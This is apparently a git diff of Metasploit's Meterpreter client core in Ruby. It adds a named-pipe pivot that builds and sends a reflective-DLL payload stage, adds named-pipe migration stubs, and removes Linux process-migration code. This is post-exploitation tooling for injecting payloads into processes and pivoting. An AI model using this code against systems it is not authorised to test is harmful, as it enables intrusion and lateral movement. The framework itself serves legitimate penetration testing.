@@ -3,6 +3,7 @@
 require 'rex/post/meterpreter/packet'
 require 'rex/post/meterpreter/extension'
 require 'rex/post/meterpreter/client'
+require 'msf/core/payload/transport_config'
 
 # Used to generate a reflective DLL when migrating. This is yet another
 # argument for moving the meterpreter client into the Msf namespace.
@@ -33,24 +34,12 @@ module Meterpreter
 ###
 class ClientCore < Extension
 
-  UNIX_PATH_MAX = 108
-  DEFAULT_SOCK_PATH = "/tmp/meterpreter.sock"
-
-  METERPRETER_TRANSPORT_SSL   = 0
-  METERPRETER_TRANSPORT_HTTP  = 1
-  METERPRETER_TRANSPORT_HTTPS = 2
-
-  TIMEOUT_SESSION = 24*3600*7  # 1 week
-  TIMEOUT_COMMS = 300          # 5 minutes
-  TIMEOUT_RETRY_TOTAL = 60*60  # 1 hour
-  TIMEOUT_RETRY_WAIT = 10      # 10 seconds
-
-  VALID_TRANSPORTS = {
-    'reverse_tcp'   => METERPRETER_TRANSPORT_SSL,
-    'reverse_http'  => METERPRETER_TRANSPORT_HTTP,
-    'reverse_https' => METERPRETER_TRANSPORT_HTTPS,
-    'bind_tcp'      => METERPRETER_TRANSPORT_SSL
-  }
+  VALID_TRANSPORTS = [
+    'reverse_tcp',
+    'reverse_http',
+    'reverse_https',
+    'bind_tcp'
+  ]
 
   include Rex::Payloads::Meterpreter::UriChecksum
 
@@ -66,6 +55,44 @@ class ClientCore < Extension
   # Core commands
   #
   ##
+
+  #
+  # create a named pipe pivot
+  #
+  def create_named_pipe_pivot(opts)
+    request = Packet.create_request('core_pivot_add')
+    request.add_tlv(TLV_TYPE_PIVOT_NAMED_PIPE_NAME, opts[:pipe_name])
+
+
+    c = Class.new(::Msf::Payload)
+    c.include(::Msf::Payload::Stager)
+    c.include(::Msf::Payload::TransportConfig)
+
+    # Include the appropriate reflective dll injection module for the target process architecture...
+    if opts[:arch] == ARCH_X86
+      c.include(::Msf::Payload::Windows::MeterpreterLoader)
+    elsif opts[:arch] == ARCH_X64
+      c.include(::Msf::Payload::Windows::MeterpreterLoader_x64)
+    end
+
+    stage_opts = {
+      force_write_handle: true,
+      datastore: {
+        'PIPEHOST' => opts[:pipe_host],
+        'PIPENAME' => opts[:pipe_name]
+      }
+    }
+
+    stager = c.new()
+
+    stage_opts[:transport_config] = [stager.transport_config_reverse_named_pipe(stage_opts)]
+    stage = stager.stage_payload(stage_opts)
+
+    request.add_tlv(TLV_TYPE_PIVOT_STAGE_DATA, stage)
+    request.add_tlv(TLV_TYPE_PIVOT_STAGE_DATA_SIZE, stage.length)
+
+    response = self.client.send_request(request)
+  end
 
   #
   # Get a list of loaded commands for the given extension.
@@ -320,7 +347,7 @@ class ClientCore < Extension
   #
   def set_session_guid(guid)
     request = Packet.create_request('core_set_session_guid')
-    request.add_tlv(TLV_TYPE_SESSION_GUID, [guid.gsub(/-/, '')].pack('H*'))
+    request.add_tlv(TLV_TYPE_SESSION_GUID, guid)
 
     client.send_request(request)
 
@@ -338,10 +365,7 @@ class ClientCore < Extension
 
     response = client.send_request(*args)
 
-    bytes = response.get_tlv_value(TLV_TYPE_SESSION_GUID)
-
-    parts = bytes.unpack('H*')[0]
-    [parts[0, 8], parts[8, 4], parts[12, 4], parts[16, 4], parts[20, 12]].join('-')
+    response.get_tlv_value(TLV_TYPE_SESSION_GUID)
   end
 
   #
@@ -541,51 +565,17 @@ class ClientCore < Extension
       raise RuntimeError, 'Cannot migrate into current process', caller
     end
 
-    if client.platform == 'linux'
-      if writable_dir.to_s.strip.empty?
-        writable_dir = tmp_folder
-      end
-
-      stat_dir = client.fs.filestat.new(writable_dir)
-
-      unless stat_dir.directory?
-        raise RuntimeError, "Directory #{writable_dir} not found", caller
-      end
-      # Rex::Post::FileStat#writable? isn't available
-    end
-
     migrate_stub = generate_migrate_stub(target_process)
     migrate_payload = generate_migrate_payload(target_process)
 
     # Build the migration request
     request = Packet.create_request('core_migrate')
 
-    if client.platform == 'linux'
-      socket_path = File.join(writable_dir, Rex::Text.rand_text_alpha_lower(5 + rand(5)))
-
-      if socket_path.length > UNIX_PATH_MAX - 1
-        raise RuntimeError, 'The writable dir is too long', caller
-      end
-
-      pos = migrate_payload.index(DEFAULT_SOCK_PATH)
-
-      if pos.nil?
-        raise RuntimeError, 'The meterpreter binary is wrong', caller
-      end
-
-      migrate_payload[pos, socket_path.length + 1] = socket_path + "\x00"
-
-      ep = elf_ep(migrate_payload)
-      request.add_tlv(TLV_TYPE_MIGRATE_BASE_ADDR, 0x20040000)
-      request.add_tlv(TLV_TYPE_MIGRATE_ENTRY_POINT, ep)
-      request.add_tlv(TLV_TYPE_MIGRATE_SOCKET_PATH, socket_path, false, client.capabilities[:zlib])
-    end
-
-    request.add_tlv( TLV_TYPE_MIGRATE_PID, target_pid )
-    request.add_tlv( TLV_TYPE_MIGRATE_PAYLOAD_LEN, migrate_payload.length )
-    request.add_tlv( TLV_TYPE_MIGRATE_PAYLOAD, migrate_payload, false, client.capabilities[:zlib])
-    request.add_tlv( TLV_TYPE_MIGRATE_STUB_LEN, migrate_stub.length )
-    request.add_tlv( TLV_TYPE_MIGRATE_STUB, migrate_stub, false, client.capabilities[:zlib])
+    request.add_tlv(TLV_TYPE_MIGRATE_PID, target_pid)
+    request.add_tlv(TLV_TYPE_MIGRATE_PAYLOAD_LEN, migrate_payload.length)
+    request.add_tlv(TLV_TYPE_MIGRATE_PAYLOAD, migrate_payload, false, client.capabilities[:zlib])
+    request.add_tlv(TLV_TYPE_MIGRATE_STUB_LEN, migrate_stub.length)
+    request.add_tlv(TLV_TYPE_MIGRATE_STUB, migrate_stub, false, client.capabilities[:zlib])
 
     if target_process['arch'] == ARCH_X64
       request.add_tlv( TLV_TYPE_MIGRATE_ARCH, 2 ) # PROCESS_ARCH_X64
@@ -614,7 +604,7 @@ class ClientCore < Extension
       # Sleep for 5 seconds to allow the full handoff, this prevents
       # the original process from stealing our loadlib requests
       ::IO.select(nil, nil, nil, 5.0)
-    else
+    elsif client.pivot_session.nil?
       # Prevent new commands from being sent while we finish migrating
       client.comm_mutex.synchronize do
         # Disable the socket request monitor
@@ -686,11 +676,8 @@ class ClientCore < Extension
   # Indicates if the given transport is a valid transport option.
   #
   def valid_transport?(transport)
-    if transport
-      VALID_TRANSPORTS.has_key?(transport.downcase)
-    else
-      false
-    end
+    return false if transport.nil?
+    VALID_TRANSPORTS.include?(transport.downcase)
   end
 
   #
@@ -751,6 +738,8 @@ private
         case t[:url]
         when /^tcp/i
           c.include(::Msf::Payload::Windows::MigrateTcp)
+        when /^pipe/i
+          c.include(::Msf::Payload::Windows::MigrateNamedPipe)
         when /^http/i
           # Covers HTTP and HTTPS
           c.include(::Msf::Payload::Windows::MigrateHttp)
@@ -760,6 +749,8 @@ private
         case t[:url]
         when /^tcp/i
           c.include(::Msf::Payload::Windows::MigrateTcp_x64)
+        when /^pipe/i
+          c.include(::Msf::Payload::Windows::MigrateNamedPipe_x64)
         when /^http/i
           # Covers HTTP and HTTPS
           c.include(::Msf::Payload::Windows::MigrateHttp_x64)
@@ -790,11 +781,11 @@ private
       opts[:lhost] = nil
     end
 
-    transport = VALID_TRANSPORTS[opts[:transport]]
+    transport = opts[:transport].downcase
 
     request = Packet.create_request(method)
 
-    scheme = opts[:transport].split('_')[1]
+    scheme = transport.split('_')[1]
     url = "#{scheme}://#{opts[:lhost]}:#{opts[:lport]}"
 
     if opts[:luri] && opts[:luri].length > 0
@@ -824,7 +815,7 @@ private
     end
 
     # do more magic work for http(s) payloads
-    unless opts[:transport].ends_with?('tcp')
+    unless transport.ends_with?('tcp')
       if opts[:uri]
         url << '/' unless opts[:uri].start_with?('/')
         url << opts[:uri]
@@ -838,7 +829,7 @@ private
       opts[:ua] ||= 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)'
       request.add_tlv(TLV_TYPE_TRANS_UA, opts[:ua])
 
-      if transport == METERPRETER_TRANSPORT_HTTPS && opts[:cert]
+      if transport == 'reverse_https' && opts[:cert]
         hash = Rex::Socket::X509Certificate.get_cert_file_hash(opts[:cert])
         request.add_tlv(TLV_TYPE_TRANS_CERT_HASH, hash)
       end
@@ -862,24 +853,7 @@ private
     request.add_tlv(TLV_TYPE_TRANS_TYPE, transport)
     request.add_tlv(TLV_TYPE_TRANS_URL, url)
 
-    return request
-  end
-
-
-  #
-  # Create a full migration payload specific to the target process.
-  #
-  def generate_migrate_payload(target_process)
-    case client.platform
-    when 'windows'
-      blob = generate_migrate_windows_payload(target_process)
-    when 'linux'
-      blob = generate_migrate_linux_payload
-    else
-      raise RuntimeError, "Unsupported platform '#{client.platform}'"
-    end
-
-    blob
+    request
   end
 
   #
@@ -905,34 +879,18 @@ private
   end
 
   #
-  # Create a full Linux-specific migration payload specific to the target process.
+  # Create a full migration payload specific to the target process.
   #
-  def generate_migrate_linux_payload
-    MetasploitPayloads.read('meterpreter', 'msflinker_linux_x86.bin')
-  end
-
-  #
-  # Determine the elf entry poitn for the given payload.
-  #
-  def elf_ep(payload)
-    elf = Rex::ElfParsey::Elf.new( Rex::ImageSource::Memory.new( payload ) )
-    ep = elf.elf_header.e_entry
-    return ep
-  end
-
-  #
-  # Get the tmp folder for the session.
-  #
-  def tmp_folder
-    tmp = client.sys.config.getenv('TMPDIR')
-
-    if tmp.to_s.strip.empty?
-      tmp = '/tmp'
+  def generate_migrate_payload(target_process)
+    case client.platform
+    when 'windows'
+      blob = generate_migrate_windows_payload(target_process)
+    else
+      raise RuntimeError, "Unsupported platform '#{client.platform}'"
     end
 
-    tmp
+    blob
   end
-
 end
 
 end; end; end
